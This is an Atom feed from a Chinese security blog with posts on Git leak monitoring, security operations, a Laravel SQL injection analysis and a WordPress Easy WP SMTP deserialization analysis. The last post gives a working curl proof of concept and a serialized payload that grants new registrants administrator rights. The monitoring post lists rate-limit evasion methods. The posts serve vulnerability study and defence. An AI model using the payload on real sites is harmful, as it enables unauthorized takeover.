<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-07-28T19:01:13+08:00</updated><id>/</id><title type="html">HellSec</title><subtitle>原创网络安全博客&lt;-|-&gt;匠心独运，做有深度的良品。</subtitle><author><name>HellSec</name></author><entry><title type="html">Git监控小议</title><link href="/operation/2019/07/28/sec-git-monitor/" rel="alternate" type="text/html" title="Git监控小议" /><published>2019-07-28T18:00:00+08:00</published><updated>2019-07-28T18:00:00+08:00</updated><id>/operation/2019/07/28/sec-git-monitor</id><content type="html" xml:base="/operation/2019/07/28/sec-git-monitor/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;那么，对于git方面的监控，我们应该做些什么呢？&lt;/p&gt;

&lt;h3 id=&quot;复合型监控&quot;&gt;复合型监控&lt;/h3&gt;

&lt;h4 id=&quot;敏感关键词监控&quot;&gt;敏感关键词监控&lt;/h4&gt;

&lt;p&gt;对于类github监控，敏感关键词监控是基础，目前主要监控点有以下几种：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;敏感email地址
敏感多级子域名
ssh key
物理机key
云平台key
硬编码的pwd
关键域名+敏感路径+敏感key的拼接
（比如https://xxx/host/{ip}?key={YOUR_API_KEY}）
组织单位标识
关键数据库名、表格名、字段名、连接字符串
vpn配置字符串
smtp配置字符串
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;大部分类github平台，查询应该是需要登录的，这里以github举个例子。&lt;/p&gt;

&lt;p&gt;我们可以用session认证，不过只有前100页的查询限制。&lt;/p&gt;

&lt;p&gt;当然，大家也可以用key+api接口，个人没采用过这个接口，据说默认搜索前5000个项目。&lt;/p&gt;

&lt;p&gt;所以利用好语法是很重要的，我们要精确地对需要监控的关键词，进行综合定位：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;搜索路径中有nsa的代码或者文件中有nsa的代码
nsa in:file,path

搜索用php写的包含userid的代码,文件名为flag，扩展名为txt
userid language:php filename:flag extension:txt

匹配关键字nsa且搜索大小为100字节的xml代码
nsa language:xml size:100

搜索conf目录下包含pass的xml代码
pass path:conf language:xml

除去名为normal_name的repo
-repo:normal_name

搜索star大于20，20&amp;lt;fork&amp;lt;30的项目
stars: &amp;gt;20 fork: 20..30


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;另外，类github平台如果做了查询限制，可以考虑采用以下几点去绕过：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IP池
多账号轮询
UA池
降频处理
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;安全监控&quot;&gt;安全监控&lt;/h4&gt;

&lt;p&gt;在大一点的企业平台，做项目管控时，会接入gitlab或者类github平台的私有项目。&lt;/p&gt;

&lt;p&gt;那么，如果要坚持精简的原则，我们需要完成哪些基础点呢？&lt;/p&gt;

&lt;p&gt;第一，版本监控
每次漏洞大规模爆发时，常常需要去检查下，己方线上环境的组件，是否出于漏洞影响范围之内。&lt;/p&gt;

&lt;p&gt;因此，维护和及时更新IT资产的checklist库，无论是实现的半自动化还是自动化监控，都是有一定积极作用的。&lt;/p&gt;

&lt;p&gt;第二，安全审计
对于项目本身，我们需要做一些代码安全审计和日常扫描。&lt;/p&gt;

&lt;p&gt;一般在代码上线，以及测试分支代码变更时，在条件允许的情况下，都应该触发自动化安全扫描。&lt;/p&gt;

&lt;p&gt;在CI自动化和日常扫描时，一旦检测到问题，需要发送报告到安全运维人员过审，再决定要不要通告开发人员，去进行整改或者代码回退。&lt;/p&gt;

&lt;p&gt;对于代码本身，可提供配置文件或者接口，供第三方软件，进行安全审计，这里不再多提。&lt;/p&gt;

&lt;h4 id=&quot;舆情监控&quot;&gt;舆情监控&lt;/h4&gt;

&lt;p&gt;现如今类github平台因为某些zz原因，成为了某些有心人撰写博客和放新闻的地方。&lt;/p&gt;

&lt;p&gt;笔者当初做舆情监控接口的时候，也添加了对这类平台的接口支持，效果感觉尚可。&lt;/p&gt;

&lt;h3 id=&quot;平台优化tips&quot;&gt;平台优化Tips&lt;/h3&gt;

&lt;h4 id=&quot;关键词定制&quot;&gt;关键词定制&lt;/h4&gt;

&lt;p&gt;如果我们在开发后期，想要去定制一些关键词咋办？&lt;/p&gt;

&lt;p&gt;存在配置文件的情况下，我们可以做关键词命中。&lt;/p&gt;

&lt;p&gt;一旦触发命中我们自己添加的关键词（不一定是标准搜索语法），也会直接通过微信或者邮件，将结果推送到负责人那里。&lt;/p&gt;

&lt;h4 id=&quot;规则可配置&quot;&gt;规则可配置&lt;/h4&gt;

&lt;p&gt;规则配置可以是多样化的，比如类github平台定期巡检，更新触发扫描，主动扫描检查。&lt;/p&gt;

&lt;p&gt;多少时间没响应，会自动再次触发报警推送，多种方式报送警报消息。&lt;/p&gt;

&lt;p&gt;制定repo或者author白名单，避免更多的误报。&lt;/p&gt;

&lt;p&gt;优化读取的内容，指定显示关键词前后文行数。&lt;/p&gt;

&lt;p&gt;设置关键词权重，避免大量冗余数据掩盖了低频高危数据。&lt;/p&gt;

&lt;h4 id=&quot;污点化&quot;&gt;污点化&lt;/h4&gt;

&lt;p&gt;在为了防止企业git项目被泄露到公网，我们在命名规范时，可以尝试制定编码规范，必须带上容易识别的特征，或者带上关键词。&lt;/p&gt;

&lt;p&gt;这样有个好处，在代码泄露时能及时监控到，但防君子不防小人，内部人员可能会做关键词替换。但这种情况，也可以通过一些特殊技巧去提升保密性。&lt;/p&gt;

&lt;p&gt;另外，白帽子提交速度可能比监控响应更快，这就需要考验规范制定者的素质了。&lt;/p&gt;

&lt;h4 id=&quot;参考文章&quot;&gt;参考文章&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/150638.html&quot;&gt;深入分析一款简单的Github信息泄露爬虫&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/xpx1995/article/details/79031397&quot;&gt;Github代码高级搜索小技巧&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/sectool/114017.html&quot;&gt;基于Github的源码白盒扫描工具Raptor&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/column/178342.html&quot;&gt;Github信息泄露专项&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="operation" /><summary type="html">笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。</summary></entry><entry><title type="html">安全运维优化思考</title><link href="/operation/2019/07/13/sec-operation/" rel="alternate" type="text/html" title="安全运维优化思考" /><published>2019-07-13T23:40:00+08:00</published><updated>2019-07-13T23:40:00+08:00</updated><id>/operation/2019/07/13/sec-operation</id><content type="html" xml:base="/operation/2019/07/13/sec-operation/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h4 id=&quot;资产统计与变更&quot;&gt;资产统计与变更&lt;/h4&gt;
&lt;p&gt;这段时间正好碰上了FastJson漏洞爆发。由于笔者所在的甲方，属于有一定规模的互联网公司，所以近期也在连夜配合各业务部门进行漏洞修补。&lt;/p&gt;

&lt;p&gt;虽然公司本身具有强大的统计平台，也具有较为成熟的资产规范，但还是花了大量时间去统计、升级那些受影响的资产。&lt;/p&gt;

&lt;p&gt;举个例子，自家公司的It资产已经接入了自动化运维，采用了基于的ES集群的平台。资产的变更能够及时以*key为基准，计入全局搜索，方便以后搜索和资产统计，以及后续的自动化升级和部署。&lt;/p&gt;

&lt;p&gt;但这种统一部署变更的法子，也存在部分痛点。其中的一个就是，一旦基于ES部署平台和Agent自身存在问题，如果没有得到及时修复的话，其自身不小的体量，可能会影响全局资产的修复进度。&lt;/p&gt;

&lt;p&gt;因此，拥有多份资产升级/变更/检测方案，能做到轻量/重量级方案互相制约，窃以为还是有必要的。&lt;/p&gt;

&lt;p&gt;另外，如果做好了内网Git资产梳理，通过代码扫描定位可能存在的漏洞和服务，也是能辅助统计受影响的资产的。&lt;/p&gt;

&lt;h4 id=&quot;自动化检测认证&quot;&gt;自动化检测认证&lt;/h4&gt;
&lt;p&gt;对于大型甲方，如果安全团队在研究好新出的漏洞Poc，对IT资产安全进行自检的时候，如果按正常流程去做，可能首先应该是先进行任务申请上报，然后向全集团发邮件，最后再进行扫描。&lt;/p&gt;

&lt;p&gt;不过，在碰上比较紧急的漏洞应急时，在跨部门协作的情况下，经常会来不及走完所有流程。&lt;/p&gt;

&lt;p&gt;笔者也曾见过研发、运维等部门，因为突然查到攻击Log，半夜一惊一乍的，去找安全部门验证攻击来源是否属于内部自检。&lt;/p&gt;

&lt;p&gt;那么针对这一点，如何做去做优化呢？&lt;/p&gt;

&lt;p&gt;不少大型企业，有时会采用统一的签名和加密机制，或者直接构建单独的平台，用于保证传输加密的可信认证。&lt;/p&gt;

&lt;p&gt;笔者窃以为，这点是可以借鉴的。如果能做好一定范围内的成本控制，在每次做自动化安全检测的时候，将加密认证信息加入检测数据包头部，以用作内部安全检测的授信，各个BU会更加轻松的识别出真实的攻击事件。&lt;/p&gt;

&lt;h4 id=&quot;敏感数据泄漏控制&quot;&gt;敏感数据泄漏控制&lt;/h4&gt;
&lt;p&gt;防止敏感数据的泄漏，以及进行事后的责任追溯，一直是甲方比较重视的点，据悉大致有这样几种方案：&lt;/p&gt;

&lt;p&gt;1.DLP数据防泄漏&lt;/p&gt;

&lt;p&gt;DLP软件一般是为了定位公司敏感数据外发行为，对于数据流量内容进行监控审计，现在市面上也有了不少成熟的合规产品。&lt;/p&gt;

&lt;p&gt;2.堡垒机&lt;/p&gt;

&lt;p&gt;堡垒机上具有监控，限制数据传输和全程录屏等功能，配合查询系统的水印功能，也能在一定程度上防止数据泄漏，以及对泄漏源进行追溯。&lt;/p&gt;

&lt;p&gt;3.数据脱敏&lt;/p&gt;

&lt;p&gt;在存储和展示敏感数据的时候，本身应该做好脱敏操作，对于数据进行加密存储和非完全展示，防止内鬼和意外泄漏事件发生。&lt;/p&gt;

&lt;p&gt;4.数据监控&lt;/p&gt;

&lt;p&gt;虽然如同Github监控和舆情监控一般的产品，并不能有效抑制数据泄漏。但在防止数据扩散，以及追溯数据泄漏来源的层面来看，还是比较有用的。&lt;/p&gt;

&lt;p&gt;如果能综合利用多类产品，再加上企业本身的安全管理规范，应该是能够在一定程度上保证数据安全的。&lt;/p&gt;

&lt;h4 id=&quot;产品检测流程&quot;&gt;产品检测流程&lt;/h4&gt;
&lt;p&gt;在原来的乙方安全测试岗位，如果需要对产品做安检的时候，随便去咨询个资深的相关产品、售前或者研发，基本上都能问出个所以然来。&lt;/p&gt;

&lt;p&gt;然而到了现在的甲方安全运维岗，可就厉害了。在工作流程细化和文档化以后，需要做安全检测时，得挨个询问多个QA/RD/PM，一点一点把他们的需求和设计方案抠出来，最后还得去找API文档自己做补充和完善，才能进行下一步的操作。&lt;/p&gt;

&lt;p&gt;笔者这两天还去拜访了一家非互联网甲方，跟那边负责安全的Leader朋友聊了下，产品上线合规的紧要性，确实是远优先于安全合规的，当然这个也是不得已而为之。&lt;/p&gt;

&lt;p&gt;总的来说，合规化有益于流程梳理，简化有益于加速产品上线，也算各有各的好处吧。&lt;/p&gt;

&lt;p&gt;当然笔者见识有限，窥一斑而不得见全豹。但总的来说，确实可以根据不同产品的实际情况，去对流程进行一些灵活变通。&lt;/p&gt;

&lt;h4 id=&quot;后记&quot;&gt;后记&lt;/h4&gt;
&lt;p&gt;以上只是简单谈了一些感受，这方面的工作资历尚浅，期待各路读者斧正和指教。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="operation" /><summary type="html">近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。</summary></entry><entry><title type="html">PHP开发框架LaravelのSQL注入漏洞分析</title><link href="/bug/2019/03/26/php-framework-Laravel-sqli/" rel="alternate" type="text/html" title="PHP开发框架LaravelのSQL注入漏洞分析" /><published>2019-03-26T19:07:00+08:00</published><updated>2019-03-26T19:07:00+08:00</updated><id>/bug/2019/03/26/php-framework-Laravel-sqli</id><content type="html" xml:base="/bug/2019/03/26/php-framework-Laravel-sqli/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;PHP开发框架Laravel，前几天在官方博客通报了一个SQL注入漏洞，这里简单分析下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;首先，这个漏洞属于网站coding写法不规范，官方给了提示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/697f6f27ly1g1gby7vp5qj20hx03ht8x.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但官方还是做了修补，升级最新版本V5.8.7可修复。&lt;/p&gt;

&lt;p&gt;我们先定位下这里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rule
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;官方推荐的写法是：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Rule::unique('users')-&amp;gt;ignore($id),
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;但如果网站没有预先对$id的值做处理时，用户可以传递恶意数据给ignore函数，就会导致SQL注入。&lt;/p&gt;

&lt;p&gt;我们来跟一下函数：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\Illuminate\Validation\Rules\Unique.php

class Unique
{
...
public function ignore($id, $idColumn = null)
    {
        if ($id instanceof Model) {
            return $this-&amp;gt;ignoreModel($id, $idColumn);
        }

        $this-&amp;gt;ignore = $id;
        $this-&amp;gt;idColumn = $idColumn ?? 'id';

        return $this;
    }

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里我们不考虑把$id写成实例的情况，$id是用户可控的话，$idColumn直接写为空即可，最后赋值情况如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$this-&amp;gt;ignore = $id;
$this-&amp;gt;idColumn = 'id';
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;如果网站代码类似这样构造的话，黑客输入的值就属于可控状态：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$id = $request-&amp;gt;input('id');
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;最后我们会走到这儿：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\Unique.php

    public function __toString()
    {
        ...
        ...
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们看下关键的代码变更：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\Unique.php

V5.8.7【最新版】
    public function __toString()
    {
            $this-&amp;gt;ignore ? '&quot;'.addslashes($this-&amp;gt;ignore).'&quot;' : 'NULL',
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\Unique.php

V5.8.4
    public function __toString()
    {

            $this-&amp;gt;ignore ? '&quot;'.$this-&amp;gt;ignore.'&quot;' : 'NULL',

    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里最新的代码v5.8.7，把$this-&amp;gt;ignore直接给addslashes了，以前这里是没有防护的。&lt;/p&gt;

&lt;p&gt;有趣的是，笔者对比了下diff，期间官方还试图对其他引用的地方进行了过滤。最后还是改成了__toString处，进行统一过滤的方式。&lt;/p&gt;

&lt;p&gt;最后提一句，后面的代码会进入DatabaseRule，进行后续SQL规则匹配。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\DatabaseRule.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这之后就没有再进一步处理，接着形成了SQL注入。&lt;/p&gt;

&lt;p&gt;参考链接：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.laravel.com/unique-rule-sql-injection-warning?fbclid=IwAR26Cs1Ewh983UxSF5fNO8Xr0hUnwSO_Ikbr08Adi20m5h5llP0WhNDmgRg&quot;&gt;官方通告&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://laravel.com/docs/5.8/validation#rule-unique&quot;&gt;说明文档&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="bug" /><summary type="html">PHP开发框架Laravel，前几天在官方博客通报了一个SQL注入漏洞，这里简单分析下。</summary></entry><entry><title type="html">WordPress Easy WP SMTP反序列化漏洞分析</title><link href="/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp/" rel="alternate" type="text/html" title="WordPress Easy WP SMTP反序列化漏洞分析" /><published>2019-03-24T16:31:21+08:00</published><updated>2019-03-24T16:31:21+08:00</updated><id>/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp</id><content type="html" xml:base="/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;首先，这个漏洞存在于版本v1.3.9。 我这里能下到最接近的老版本是v1.3.8，可惜v1.3.9更迭了一些重要代码，我找到的版本，应该不能复现这个漏洞。
下面我会根据网上一些细节进行分析，没耐心的大佬可以直接跳到最后看原版的分析。&lt;/p&gt;

&lt;p&gt;关键函数位置在：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wp-content/plugins/easy-wp-smtp/easy-wp-smtp.php::admin_init
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里的函数，可以在用户登入admin界面时进行hook，本来是用来查看删除日志，导入/删除/更新数据库里的配置的。&lt;/p&gt;

&lt;p&gt;然而他这里没有对用户权限做严格的验证，甚至没有认证过的游客一样可以触发这个漏洞。
/wp-admin/admin.php的注释里对admin_init解释道：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Note, this does not just run on user-facing admin screens. It runs on admin-ajax.php and admin-post.php as well.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们这里在admin-ajax.php处，为了触发漏洞，发送了action=swpsmtp_clear_log的ajax交互请求：&lt;/p&gt;

&lt;p&gt;网上给出的poc：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;网上的poc是利用函数中的一个导入配置文件的功能：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在导入以后，他会对文件内容进行一个反序列化解析：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以使用下面的array:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;序列化以后成为：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;再次组合array：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(81)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;a:2:{s:18:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;users_can_register&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:1:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:12:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;default_role&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:13:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;administrator&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;}&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;checksum&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(32)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;第二次序列化后，将下面的结果，存入我们要上传的文件/tmp/upload.txt里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:2:{s:4:&quot;data&quot;;s:81:&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;;s:8:&quot;checksum&quot;;s:32:&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;简单说下，为何要这么构造呢，因为我们的插件代码里有这么一段：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
if ( empty( $in[ 'data' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( empty( $in[ 'checksum' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {
	 echo $err_msg;
	 wp_die();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以看到，需要绕过两个部分：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unserialize( $in_raw );
unserialize( $in['data'] )
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;经过两次反序列化的结果后，data的内容，也就是下面的数组：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;才能分拆为key-value，进入后续函数：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;foreach ( $data as $key =&amp;gt; $value ) 
{
	    update_option( $key, $value );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;users_can_register是配置的注册启用选项，default_role是默认普通权限，administrator是管理权限。
到这里就明了了，开启注册后，我们注册的普通用户都是管理权限，没必要去取原来的管理密码，反正也解不出来…&lt;/p&gt;

&lt;p&gt;下面我们可以跟到更新数据库配置的位置，这就已经到主branch了：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/wp-includes/option.php::update_option
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
